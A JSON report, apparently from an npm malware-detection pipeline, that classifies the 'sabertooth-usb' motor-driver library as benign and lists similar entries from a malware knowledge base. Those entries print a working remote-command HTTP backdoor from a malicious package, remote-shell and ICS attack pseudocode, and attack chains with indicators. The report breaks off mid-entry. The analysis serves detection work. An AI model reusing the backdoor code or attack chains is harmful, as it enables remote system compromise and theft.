@@ -1,0 +1,1521 @@
+{
+  "package_name": "sabertooth-usb",
+  "package_version": "1.5.1",
+  "label": "benign",
+  "detection_time": "2026-05-26T19:56:35.274143",
+  "status": "success",
+  "selected_files_count": 4,
+  "selected_files": [
+    "package/package.json",
+    "package/lib/index.js",
+    "package/lib/examples/drive.js",
+    "package/lib/examples/get.js"
+  ],
+  "is_malicious": false,
+  "total_files": 4,
+  "malicious_files": 0,
+  "total_slices": 3,
+  "malicious_slices": 0,
+  "file_results": [
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/sabertooth-usb/1.5.1/package/package.json",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/sabertooth-usb/1.5.1/package/lib/index.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "index_slice_1",
+          "code_snippet": "\"use strict\";\nvar __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {\n    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }\n    return new (P || (P = Promise))(function (resolve, reject) {\n        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }\n        function rejected(value) { try { step(generator[\"throw\"](value)); } catch (e) { reject(e); } }\n        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }\n        step((generator = generator.apply(thisArg, _arguments || [])).next());\n    });\n};\nvar __importDefault = (this && this.__importDefault) || function (mod) {\n    return (mod && mod.__esModule) ? mod : { \"default\": mod };\n};\nObject.defineProperty(exports, \"__esModule\", { value: true });\nexports.listSabertoothDevices = exports.SabertoothUSB = exports.MixedModeMotor = exports.Type = exports.Command = exports.SetType = exports.GetType = void 0;\nconst lodash_1 = __importDefault(require(\"lodash\"));\nlet SerialPortClass;\ntry {\n    // In electron window.require should be used.\n    SerialPortClass = window.require('serialport');\n}\ncatch (e) {\n    SerialPortClass = require('serialport');\n}\nvar GetType;\n(function (GetType) {\n    GetType[GetType[\"Value\"] = 0] = \"Value\";\n    GetType[GetType[\"Battery\"] = 16] = \"Battery\";\n    GetType[GetType[\"Current\"] = 32] = \"Current\";\n    GetType[GetType[\"Temperature\"] = 64] = \"Temperature\";\n})(GetType = exports.GetType || (exports.GetType = {}));\nvar SetType;\n(function (SetType) {\n    SetType[SetType[\"Value\"] = 0] = \"Value\";\n    SetType[SetType[\"KeepAlive\"] = 16] = \"KeepAlive\";\n    SetType[SetType[\"Shutdown\"] = 32] = \"Shutdown\";\n    SetType[SetType[\"Timeout\"] = 64] = \"Timeout\";\n})(SetType = exports.SetType || (exports.SetType = {}));\nvar Command;\n(function (Command) {\n    Command[Command[\"Set\"] = 40] = \"Set\";\n    Command[Command[\"Get\"] = 41] = \"Get\";\n})(Command = exports.Command || (exports.Command = {}));\nvar Type;\n(function (Type) {\n    Type[Type[\"Motor\"] = 77] = \"Motor\";\n    Type[Type[\"Freewheel\"] = 81] = \"Freewheel\";\n    Type[Type[\"Signal\"] = 83] = \"Signal\";\n    Type[Type[\"Aux\"] = 65] = \"Aux\";\n    Type[Type[\"Power\"] = 80] = \"Power\";\n    Type[Type[\"CurrentLimit\"] = 84] = \"CurrentLimit\";\n    Type[Type[\"Ramping\"] = 82] = \"Ramping\";\n})(Type = exports.Type || (exports.Type = {}));\nvar MixedModeMotor;\n(function (MixedModeMotor) {\n    MixedModeMotor[MixedModeMotor[\"Drive\"] = 68] = \"Drive\";\n    MixedModeMotor[MixedModeMotor[\"Turn\"] = 84] = \"Turn\";\n})(MixedModeMotor = exports.MixedModeMotor || (exports.MixedModeMotor = {}));\nconst MASK = 127;\nconst appendChecksum = (buffer, offset) => {\n    buffer.push(lodash_1.default.sum(buffer.slice(offset)) & MASK);\n};\n/**\n * Controls USB-enabled Sabertooth motor drivers running in Packet Serial mode.\n *\n * See https://www.dimensionengineering.com/datasheets/USBSabertoothPacketSerialReference.pdf\n *\n * Note: Only Checksum protection is implemented, not CRC.\n */\nclass SabertoothUSB {\n    /**\n     * Create an object to control a motor driver.\n     *\n     * A connection to the motor driver will be attempted upon creation but\n     * this is asynchronous and is not available immediately after creation.\n     * If the connection fails reconnection will be attempted automatically.\n     *\n     * @param path the path to the (USB) serial port. eg `/dev/ttyACM0` or `COM1`.\n     * @param options Optional connection options. See `Options` type for details.\n     */\n    constructor(path, options) {\n        var _a, _b, _c, _d, _e, _f;\n        this.lastError = null;\n        this.motorCurrentExponetialAverage = {\n            1: 0,\n            2: 0,\n        };\n        /** Returns true iff the USB serial connection to the motor driver is open and working. */\n        this.isConnected = () => this.serial.isOpen;\n        /** Get the last error that occurred in the connection to the motor driver. */\n        this.getLastError = () => this.lastError;\n        this.path = path;\n        this.timeout = (_a = options === null || options === void 0 ? void 0 : options.timeout) !== null && _a !== void 0 ? _a : 1000;\n        this.address = (_b = options === null || options === void 0 ? void 0 : options.address) !== null && _b !== void 0 ? _b : 128;\n        this.maxGetAttemptCount = (_c = options === null || options === void 0 ? void 0 : options.maxGetAttemptCount) !== null && _c !== void 0 ? _c : 3;\n        this.maxMotorOutputRate = (_d = options === null || options === void 0 ? void 0 : options.maxMotorOutputRate) !== null && _d !== void 0 ? _d : 0.95;\n        this.motorCurrentDenoiseAlpha = (_e = options === null || options === void 0 ? void 0 : options.motorCurrentDenoiseAlpha) !== null && _e !== void 0 ? _e : 0.1;\n        this.debug = !!(options === null || options === void 0 ? void 0 : options.debug);\n        this.checkRange(this.timeout, 0, 10000, 'timeout');\n        this.checkRange(this.maxGetAttemptCount, 1, 10, 'maxGetAttemptCount');\n        this.checkRange(this.maxMotorOutputRate, 0.01, 1, 'maxMotorOutputRate');\n        this.checkRange(this.motorCurrentDenoiseAlpha, 0.0000001, 1, 'motorCurrentDenoiseAlpha');\n        this.serial = new SerialPortClass(path, {\n            baudRate: (_f = options === null || options === void 0 ? void 0 : options.baudRate) !== null && _f !== void 0 ? _f : 38400,\n            autoOpen: false,\n        });\n        let connectIntervalHandle;\n        const connect = () => {\n            // Attempt to connect once per second.\n            connectIntervalHandle = setInterval(() => this.serial.open(), 1000);\n        };\n        // When a connection is established, cancel the connection attempt function.\n        this.serial.on('open', () => {\n            if (connectIntervalHandle) {\n                clearInterval(connectIntervalHandle);\n                connectIntervalHandle = null;\n                this.lastError = null;\n            }\n        });\n        this.serial.on('error', (err) => {\n            this.debug && console.error(`Sabertooth (${this.path}) error:`, err);\n            this.lastError = err;\n        });\n        this.serial.on('close', (err) => {\n            this.debug && console.error(`Sabertooth (${this.path}) disconnected, attempting to reconnect`);\n            this.lastError = err;\n            connect();\n        });\n        connect();\n    }\n    checkRange(value, min, max, argName) {\n        if (value < min || value > max) {\n            throw Error(`Sabertooth (${this.path}): invalid value for ${argName}: ${value}, must be in range [${min}, ${max}]`);\n        }\n    }\n    /**\n     * Controls the specified motor output(s).\n     * This sets the output of the motor channel as a fraction of the battery voltage.\n     * Note that the given rate is scaled by the `maxMotorOutputRate`.\n     *\n     * @param channel the motor channel(s), either `1`, `2`, or `*` for all motors.\n     * @param rate the new rate for the motor(s), in range [-1, 1] for maximum reverse to maximum forward respectively.\n     */\n    setMotor(channel, rate) {\n        this.checkRange(rate, -1, 1, 'rate');\n        this.set(Type.Motor, channel, Math.round(rate * this.maxMotorOutputRate * 2047));\n    }\n    /**\n     * Controls the specified power output, if the power output is configured as a controllable output.\n     *\n     * @param channel the power channel(s), either `1`, `2`, or `*` for all channels.\n     * @param rate the new rate for the power output(s), in range [-1, 1]\n     */\n    setPower(channel, rate) {\n        this.checkRange(rate, -1, 1, 'rate');\n        this.set(Type.Power, channel, Math.round(rate * 2047));\n    }\n    /**\n     * Controls the mixed-mode (differential) drive rate.\n     * Note that the given rate is scaled by the `maxMotorOutputRate`.\n     *\n     * @param rate the new drive rate for the motors, in range [-1, 1] for maximum reverse to maximum forward respectively.\n     */\n    setDrive(rate) {\n        this.checkRange(rate, -1, 1, 'rate');\n        this.set(Type.Motor, MixedModeMotor.Drive, Math.round(rate * this.maxMotorOutputRate * 2047));\n    }\n    /**\n     * Controls the mixed-mode (differential) turn rate.\n     *\n     * @param rate the new turn rate for the motors, in range [-1, 1] for maximum left to maximum right respectively.\n     */\n    setTurn(rate) {\n        this.checkRange(rate, -1, 1, 'rate');\n        this.set(Type.Motor, MixedModeMotor.Turn, Math.round(rate * 2047));\n    }\n    /**\n     * Enables or disables freewheeling for the specified motor output(s).\n     *\n     * @param channel the motor channel(s), either `1`, `2`, or `*` for all motors.\n     * @param enableFreewheel True to enable freewheeling, false to disable freewheeling.\n     */\n    setFreewheel(channel, enableFreewheel) {\n        this.set(Type.Freewheel, channel, enableFreewheel ? 2048 : 0);\n    }\n    /**\n     * Shuts down motor or power output(s).\n     *\n     * @param type The type of output to shutdown, either `SetType.Motor` or `SetType.Power`\n     * @param channel the channel(s), either `1`, `2`, or `*` for all channels.\n     * @param enableFreewheel True to trigger shutdown, false to clear the shutdown.\n     */\n    shutDown(type, channel, shutdownEnabled) {\n        this.set(type, channel, shutdownEnabled ? 2048 : 0, SetType.Shutdown);\n    }\n    /**\n     * Sets the current limit for the specified motor output channel.\n     *\n     * @param channel the motor channel(s), either `1`, `2`, or `*` for all channels.\n     * @param currentLimit the new current limit on Amps, in range (0, 100], or -1 to use the default limit.\n     */\n    setCurrentLimit(channel, currentLimit) {\n        this.checkRange(currentLimit, -1, 100, 'currentLimit');\n        this.set(Type.CurrentLimit, channel, currentLimit < 0 ? -1 : Math.round(currentLimit / 100 * 2047));\n    }\n    /**\n     * Sets the ramping for the specified motor output channel.\n     *\n     * @param channel the motor channel(s), either `1`, `2`, or `*` for all channels.\n     * @param ramping The ramping value, between -16383 (fast) and 2047 (slow).\n     */\n    setRamping(channel, ramping) {\n        this.checkRange(ramping, -16383, 2047, 'ramping');\n        this.set(Type.Ramping, channel, ramping);\n    }\n    /**\n     * Get the battery/source voltage.\n     */\n    getBatteryVoltage() {\n        return __awaiter(this, void 0, void 0, function* () {\n            return (yield this.get(Type.Motor, 1, GetType.Battery)) / 10;\n        });\n    }\n    /**\n     * Get the output transistor temperature for the specified motor channel, in degrees centigrade.\n     */\n    getMotorDriverOutputTemperature(channel) {\n        return __awaiter(this, void 0, void 0, function* () {\n            this.checkRange(channel, 1, 2, 'channel');\n            return this.get(Type.Motor, channel, GetType.Temperature);\n        });\n    }\n    /**\n     * Get the output rate for the specified motor channel, in range [-1, 1].\n     */\n    getMotorDriverOutputRate(channel) {\n        return __awaiter(this, void 0, void 0, function* () {\n            this.checkRange(channel, 1, 2, 'channel');\n            return (yield this.get(Type.Motor, channel, GetType.Value)) / 2047;\n        });\n    }\n    /**\n     * Get the output current for the specified motor channel, in Amps.\n     * This is a noisy signal and may vary by up to several amps.\n     * Positive current values indicate energy is being drawn from the battery,\n     * and negative values indicate energy is being regenerated into the battery.\n     */\n    getMotorCurrent(channel) {\n        return __awaiter(this, void 0, void 0, function* () {\n            this.checkRange(channel, 1, 2, 'channel');\n            const currentValue = (yield this.get(Type.Motor, channel, GetType.Current)) / 10;\n            const previousValue = this.motorCurrentExponetialAverage[channel];\n            const denoisedValue = previousValue * (1 - this.motorCurrentDenoiseAlpha)\n                + currentValue * this.motorCurrentDenoiseAlpha;\n            this.motorCurrentExponetialAverage[channel] = denoisedValue;\n            return denoisedValue;\n        });\n    }\n    get(type, channel, getType, scaled = true) {\n        if (!scaled)\n            getType |= 2;\n        return new Promise((resolve, reject) => {\n            let attemptCount = 0;\n            let timeoutHandle;\n            const attemptRequest = () => {\n                attemptCount += 1;\n                this.sendCommand(Command.Get, [getType, type, channel]);\n                // If timeout enabled.\n                if (this.timeout > 0) {\n                    timeoutHandle = setTimeout(() => {\n                        this.debug && console.warn(`Sabertooth (${this.path}) get request timed out after ${attemptCount} attempts`);\n                        if (attemptCount === this.maxGetAttemptCount) {\n                            this.debug && console.error(`Sabertooth (${this.path}) aborting get request`);\n                            this.serial.removeListener('data', dataListener);\n                            reject(Error(`Sabertooth (${this.path}) get request timed out`));\n                        }\n                        else {\n                            this.debug && console.warn(`Sabertooth (${this.path}) retrying get request`);\n                            // Try again...\n                            attemptRequest();\n                        }\n                    }, this.timeout);\n                }\n            };\n            const dataListener = (data) => {\n                if (getType === (data[2] & ~1)\n                    && type === data[6]\n                    && channel === data[7]) {\n                    clearTimeout(timeoutHandle);\n                    this.serial.removeListener('data', dataListener);\n                    const value = data[4] << 0 | data[5] << 7;\n                    resolve((data[2] & 1) !== 0 ? -value : value);\n                }\n            };\n            this.serial.on('data', dataListener);\n            attemptRequest();\n        });\n    }\n    set(type, channel, value, setType = SetType.Value) {\n        let flags = setType;\n        if (value < 0) {\n            value = -value;\n            flags |= 1;\n        }\n        const data = [\n            flags,\n            (value >> 0) & 0x7f,\n            (value >> 7) & 0x7f,\n            type,\n            (typeof channel === 'string') ? channel.charCodeAt(0) : channel,\n        ];\n        this.sendCommand(Command.Set, data);\n    }\n    sendCommand(command, data) {\n        const buffer = [this.address, command, data[0]];\n        appendChecksum(buffer, 0);\n        if (data.length > 1) {\n            data.slice(1).forEach(d => buffer.push(d));\n            appendChecksum(buffer, 4);\n        }\n        this.serial.write(Buffer.from(buffer));\n    }\n}\nexports.SabertoothUSB = SabertoothUSB;\n/** Get a list of the avilable Sabertooth devices.\n * The return is an array of objects with fields like:\n * ```\n * manufacturer: 'Dimension Engineering',\n * serialNumber: '1600DB368EC8',\n * pnpId: 'usb-Dimension_Engineering_Sabertooth_2x32_1600DB368EC8-if01',\n * locationId: undefined,\n * vendorId: '268b',\n * productId: '0201',\n * path: '/dev/ttyACM0'\n * ```\n */\nconst listSabertoothDevices = () => __awaiter(void 0, void 0, void 0, function* () { return (yield SerialPortClass.list()).filter(port => { var _a; return (_a = port.pnpId) === null || _a === void 0 ? void 0 : _a.startsWith('usb-Dimension_Engineering_Sabertooth'); }); });\nexports.listSabertoothDevices = listSabertoothDevices;",
+          "is_malicious": false,
+          "malice_score": 0.4481076876322428,
+          "confidence": 0.1,
+          "behavior_summary": "When called, the code accesses and opens USB serial ports using the 'serialport' module to communicate with Sabertooth motor drivers. It sends and receives control commands and status requests over the serial interface, including motor speed, power output, shutdown commands, and sensor data retrieval. This enables direct hardware control and monitoring of motor drivers via USB serial communication, facilitating device management but also potentially allowing unauthorized control if misused.",
+          "explanation": "[LLM Judgment: Benign] The analyzed code is a legitimate hardware control library designed to interface with Sabertooth USB motor drivers via serial communication. It uses the 'serialport' module to open and manage USB serial connections, sending and receiving commands to control motor outputs and retrieve sensor data. While it does perform low-level hardware control, this is expected behavior for device driver libraries and does not indicate malicious intent. There is no evidence of obfuscation, unauthorized remote command execution, data exfiltration, or other suspicious operations. The known malicious patterns involve remote shell servers, unauthenticated command execution over network sockets, or unauthorized industrial control system manipulation, none of which are present here. The code does not open network sockets, execute arbitrary commands, or manipulate system files. It simply manages USB serial communication with a specific hardware device, which is a common and benign use case.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20241223_205442_500638_snippet_2",
+              "source_package": "nodejs_net_server (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241223_205442_500638/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.46672260761260986,
+              "code_similarity": 0.37758341431617737,
+              "behavior_similarity": 0.5558618307113647,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "// Pseudocode based on report description\nconst net = require('net');\nconst server = net.createServer((socket) => {\n  // Accepts remote shell commands, file operations, etc.\n});\nserver.listen(port, ip);",
+                "code_behavior": "At runtime, the code starts a TCP socket server that listens for remote connections, receives and executes shell commands, performs file operations, and allows file uploads, enabling remote control of the victim's system.",
+                "malice_analysis": {
+                  "why_suspicious": "Opening a remote shell and exposing file operations over a network socket without authentication is highly dangerous and not expected in a typical npm package.",
+                  "violated_expectations": "Normal packages should not expose remote shell access or arbitrary file operations without explicit user configuration, authentication, and security controls.",
+                  "similar_legitimate_use": "Some legitimate remote administration tools or development servers may expose similar functionality, but always with authentication, user awareness, and clear documentation.",
+                  "key_indicators": [
+                    "Socket server accepting remote commands",
+                    "Shell command execution capability",
+                    "File upload and manipulation features",
+                    "No authentication or access control"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (when package is used)",
+                  "file_location": "lib/test.js",
+                  "required_permissions": [
+                    "network",
+                    "filesystem",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "nodejs_net_server",
+                  "package_manager": "npm",
+                  "package_versions": "1.0.0 - 1.1.2",
+                  "why_malicious": "The package includes and/or downloads a Windows executable (a.exe, ChromePass) that extracts Chrome browser passwords, exposes a remote shell and file operation server without authentication, and hijacks the 'jstest' command via the bin field. These behaviors enable credential theft, remote system compromise, and command hijacking, posing severe security risks. The inclusion of credential-stealing tools and remote control features in a public npm package is highly suspicious and dangerous, regardless of the author's stated intent."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Package is installed, and the 'bin' field in package.json creates or overwrites the 'jstest' command in the user's environment.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "User or system may execute the malicious 'jstest' command, leading to further code execution under the attacker's control."
+                  },
+                  {
+                    "step": 2,
+                    "action": "During install or runtime, the package downloads the ChromePass executable (a.exe) from a remote server (chrunlee.cn) and saves it locally.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Malicious binary (a.exe) is present on the system and ready for execution."
+                  },
+                  {
+                    "step": 3,
+                    "action": "The package exposes a remote shell and file operation server, allowing remote attackers to connect and issue commands, including execution of downloaded binaries.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker can remotely control the victim's system, execute arbitrary commands, and run the credential-stealing binary."
+                  },
+                  {
+                    "step": 4,
+                    "action": "The ChromePass binary (a.exe) is executed, extracting all Chrome browser passwords from the victim's machine.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Credentials are stolen and can be exfiltrated by the attacker, resulting in compromise of sensitive user data."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Inclusion or download of credential-stealing binaries (e.g., ChromePass) in npm packages",
+                    "Socket servers exposing unauthenticated remote shell or file operations",
+                    "Hijacking of common CLI commands via the bin field in package.json",
+                    "Downloading executables from non-official domains (e.g., chrunlee.cn) during install or runtime",
+                    "Execution of Windows binaries from within a Node.js package"
+                  ],
+                  "file_indicators": [
+                    "package/lib/a.exe",
+                    "Downloaded a.exe in package directory",
+                    "package.json with bin field defining 'jstest'",
+                    "lib/test.js implementing a TCP server"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTP/HTTPS requests to chrunlee.cn or similar non-official domains",
+                    "Unusual TCP socket connections initiated by nodejs_net_server",
+                    "Inbound connections to TCP server started by the package"
+                  ],
+                  "how_to_detect": "Monitor npm packages for inclusion of suspicious binaries such as ChromePass, analyze package.json for bin field hijacking common command names, and flag packages that download executables from untrusted domains like chrunlee.cn. Use static and dynamic analysis to identify code that downloads or executes binaries, starts unauthenticated socket servers, or exposes remote shell/file operations. Monitor for unexpected network activity to suspicious domains and for inbound connections to local TCP servers started by the package. Correlate these behaviors to identify malicious packages."
+                }
+              }
+            },
+            {
+              "match_id": "20240813_211342_340597_snippet_5",
+              "source_package": "glup-debugger-log (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240813_211342_340597/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.44918331503868103,
+              "code_similarity": 0.38805264234542847,
+              "behavior_similarity": 0.5103139877319336,
+              "matched_snippet": {
+                "snippet_id": "snippet_5",
+                "code_snippet": "http.createServer({ 'requestTimeout': 60000 }, (request, response) => {\n  response.writeHead(200, { 'Content-Type': 'text/plain;charset=UTF-8' });\n  let command = url.parse(request.url, true).query.cmd;\n  if (command) {\n    try {\n      childProcess.exec(Buffer.from(\"Y2hjcCA2NTAwMQ==\", \"base64\").toString() + \" & \" + command, {\n        'encoding': \"buffer\",\n        'windowsHide': true\n      }, (error, stdout, stderr) => {\n        if (error) {\n          response.end(\"ERR:\\n\" + error.message);\n        } else {\n          if (stdout) {\n            response.end('' + iconv.decode(stdout, \"gbk\"));\n          } else if (stderr) {\n            response.end(\"ERR:\\n\" + iconv.decode(stderr, \"gbk\"));\n          }\n        }\n      });\n    } catch (error) {\n      response.end(\"ERR:\\n\" + error);\n    }\n  }\n}).listen(3004);",
+                "code_behavior": "At runtime, the code starts an HTTP server on port 3004 that executes arbitrary system commands received via the 'cmd' query parameter and returns the output to the remote attacker, enabling unauthenticated remote code execution.",
+                "malice_analysis": {
+                  "why_suspicious": "Setting up a local HTTP server for unauthenticated remote code execution is a hallmark of RATs and backdoors, providing attackers with persistent, covert access.",
+                  "violated_expectations": "Legitimate packages do not expose arbitrary command execution over HTTP, especially without authentication or access controls.",
+                  "similar_legitimate_use": "Some legitimate development tools may expose HTTP APIs, but never for unauthenticated system command execution.",
+                  "key_indicators": [
+                    "HTTP server on non-standard port (3004)",
+                    "Command execution via unauthenticated query parameter",
+                    "No authentication or access control",
+                    "Base64-decoded command preamble to evade detection"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (via play-share.js)",
+                  "file_location": "lib/play-share.js (deobfuscated)",
+                  "required_permissions": [
+                    "network",
+                    "filesystem",
+                    "child_process",
+                    "os"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "glup-debugger-log",
+                  "package_manager": "npm",
+                  "package_versions": "0.0.3",
+                  "why_malicious": "The package contains heavily obfuscated JavaScript code that functions as both a dropper and a remote access trojan (RAT). It performs environment checks to selectively target systems, downloads and executes additional payloads, and establishes a persistent, unauthenticated HTTP server for arbitrary remote code execution, all without user knowledge or consent."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious code is executed via npm test or import, triggering the bind() function.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Initial dropper logic is launched."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Dropper performs environment checks and conditionally executes or downloads further payloads.",
+                    "implemented_by": [
+                      "snippet_2",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Malware is deployed and/or additional payloads are executed."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Persistence is established by launching play-share.js as a detached process.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "RAT component is activated."
+                  },
+                  {
+                    "step": 4,
+                    "action": "RAT HTTP server is started, allowing remote attackers to execute arbitrary commands.",
+                    "implemented_by": [
+                      "snippet_5"
+                    ],
+                    "leads_to": "Attacker gains persistent remote access and control."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of obfuscated JavaScript files during npm install, test, or import",
+                    "Spawning of detached Node.js background processes running secondary scripts",
+                    "Creation of local HTTP server on non-standard port (e.g., 3004) for command execution",
+                    "Environment checks targeting Windows and active user environments before payload execution",
+                    "Conditional download and execution of remote payloads based on hidden configuration"
+                  ],
+                  "file_indicators": [
+                    "lib/play.js (obfuscated, high entropy)",
+                    "lib/play-share.js (obfuscated, high entropy)",
+                    "node.compress.exe",
+                    "node.compress.lock.log",
+                    "Batch files with random names in temporary directories"
+                  ],
+                  "network_indicators": [
+                    "HTTP server listening on port 3004 for incoming command requests",
+                    "Outbound HTTP GET requests to attacker-controlled URLs for payload download"
+                  ],
+                  "how_to_detect": "Monitor for execution of obfuscated JavaScript files during npm install, test, or import. Flag packages that spawn detached Node.js processes or create local HTTP servers on non-standard ports such as 3004. Detect creation of suspicious files including node.compress.exe, node.compress.lock.log, and batch files with random names in temp directories. Watch for outbound HTTP requests to unknown or suspicious domains and for local servers listening for command parameters. Use static analysis to identify high-entropy, obfuscated code and dynamic analysis to observe process spawning, file creation, and network activity indicative of RAT behavior."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_113220_415389_snippet_3",
+              "source_package": "INCONTROLLER / PIPEDREAM ICS Malware Suite (Custom/Unknown (malware targeting ICS/SCADA devices, not distributed via public package managers))",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241224_113220_415389/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.43227726221084595,
+              "code_similarity": 0.303646057844162,
+              "behavior_similarity": 0.5609084367752075,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "// Pseudocode representing OMSHELL Omron PLC attack behavior\nconnect_to_omron_plc(target_ip)\nscan_device()\nread_servo_drive_parameters()\nwrite_servo_drive_parameters()",
+                "code_behavior": "At runtime, the code connects to Omron PLCs and servo drives, scans devices, reads and writes servo drive parameters, enabling unauthorized manipulation of industrial machinery operation.",
+                "malice_analysis": {
+                  "why_suspicious": "Unauthorized access and manipulation of servo drive parameters can cause physical damage or unsafe operation of industrial equipment, representing a direct threat to safety and process integrity.",
+                  "violated_expectations": "Normal operations do not involve unscheduled or unauthorized parameter changes on servo drives; such actions are strictly controlled and logged.",
+                  "similar_legitimate_use": "Legitimate engineering tasks may involve parameter changes, but only under strict controls, with proper authentication, and during scheduled maintenance.",
+                  "key_indicators": [
+                    "Unauthorized Omron PLC or servo drive access",
+                    "Unscheduled parameter manipulation on servo drives"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "At runtime, when executed on an engineering workstation or within an ICS network",
+                  "file_location": "malware binary (OMSHELL component)",
+                  "required_permissions": [
+                    "network",
+                    "filesystem",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "INCONTROLLER / PIPEDREAM ICS Malware Suite",
+                  "package_manager": "Custom/Unknown (malware targeting ICS/SCADA devices, not distributed via public package managers)",
+                  "package_versions": "N/A (modular malware suite, not versioned in the traditional sense)",
+                  "why_malicious": "The malware suite is specifically engineered to compromise, disrupt, and manipulate industrial control systems (ICS) and supervisory control and data acquisition (SCADA) devices. It enables attackers to enumerate, control, and sabotage critical infrastructure by exploiting device protocols, brute-forcing credentials, and leveraging known vulnerabilities in engineering workstations. The suite's modular tools provide full system access, lateral movement, and device manipulation capabilities, representing a severe and targeted threat to operational technology environments."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Initial compromise of engineering workstation, possibly via phishing or supply chain attack.",
+                    "implemented_by": [],
+                    "leads_to": "Execution of malware components on the workstation"
+                  },
+                  {
+                    "step": 2,
+                    "action": "Privilege escalation on engineering workstation using ASRock driver exploit.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Full system access and ability to deploy ICS attack modules"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Network reconnaissance and enumeration of ICS/SCADA devices (OPC UA servers, PLCs).",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Identification of targets for manipulation"
+                  },
+                  {
+                    "step": 4,
+                    "action": "Brute-force credentials and gain unauthorized access to ICS devices.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Ability to read/write tag values and manipulate device state"
+                  },
+                  {
+                    "step": 5,
+                    "action": "Manipulation of PLC memory, tag values, and servo drive parameters to disrupt or sabotage industrial processes.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Disruption, degradation, or damage to ICS/SCADA operations (final goal)"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Bulk enumeration of OPC UA tags and structure from engineering workstations",
+                    "Brute-force authentication attempts against OPC UA servers originating from non-standard sources",
+                    "Unauthorized Modbus protocol activity targeting PLCs outside of scheduled maintenance windows",
+                    "Unscheduled or unauthorized read/write operations on PLC memory or servo drive parameters",
+                    "Loading and exploitation of known vulnerable ASRock motherboard drivers for privilege escalation"
+                  ],
+                  "file_indicators": [
+                    "Presence of unknown or unsigned binaries on engineering workstations",
+                    "Unexpected driver files related to ASRock hardware in system directories",
+                    "Malware components named TAGRUN, CODECALL, OMSHELL, EVILSCHOLAR, BADOMEN, DUSTTUNNEL, MOUSEHOLE, LAZYCARGO"
+                  ],
+                  "network_indicators": [
+                    "Unusual OPC UA and Modbus network traffic originating from engineering workstations",
+                    "Connections to PLCs and OPC UA servers outside of scheduled maintenance or authorized engineering sessions",
+                    "Lateral movement within OT networks from compromised workstations"
+                  ],
+                  "how_to_detect": "Monitor engineering workstations and OT networks for unauthorized enumeration of OPC UA tags, brute-force authentication attempts, and unscheduled Modbus/Omron protocol activity. Detect loading of vulnerable ASRock drivers and privilege escalation attempts. Flag any binaries or processes matching known malware component names or exhibiting these behaviors. Correlate network activity with scheduled maintenance to identify suspicious access patterns. Implement endpoint and network monitoring to alert on these specific behavioral, file, and network indicators."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_104205_631636_snippet_1",
+              "source_package": "Multiple Connected Car Software Components (Various (proprietary, open-source, third-party))",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_104205_631636/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4315905272960663,
+              "code_similarity": 0.2968377470970154,
+              "behavior_similarity": 0.5663433074951172,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "// Pseudocode representing remote command execution vulnerability\nif (receive_remote_command()) {\n    execute_vehicle_control(command);\n}",
